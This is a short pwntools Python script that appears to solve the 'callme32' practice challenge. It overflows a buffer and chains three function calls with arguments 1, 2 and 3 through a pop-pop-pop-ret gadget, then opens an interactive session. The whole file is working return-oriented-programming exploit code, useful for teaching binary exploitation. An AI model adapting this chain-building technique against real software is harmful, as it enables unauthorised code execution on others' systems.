from pwn import *

t = process("./callme32")

gdb_cmd = ["c"]  # "b *0x080487a6"

context.terminal = ["gnome-terminal", "-e"]
gdb.attach(t, gdbscript='\n'.join(gdb_cmd))

callme_one_address = 0x080485c0
callme_two_address = 0x08048620
callme_three_address = 0x080485b0
pop3ret = 0x080488a9 # pop esi ; pop edi ; pop ebp ; ret

# rop = cyclic(200, n=4)
offset = cyclic_find("laaa", n=4)
# print(offset)

rop = "A"*offset
rop += p32(callme_one_address)
rop += p32(pop3ret)
rop += p32(1)
rop += p32(2)
rop += p32(3)

rop += p32(callme_two_address)
rop += p32(pop3ret)
rop += p32(1)
rop += p32(2)
rop += p32(3)

rop += p32(callme_three_address)
rop += p32(pop3ret)
rop += p32(1)
rop += p32(2)
rop += p32(3)

t.recvuntil('\n>')
t.sendline(rop)

t.interactive()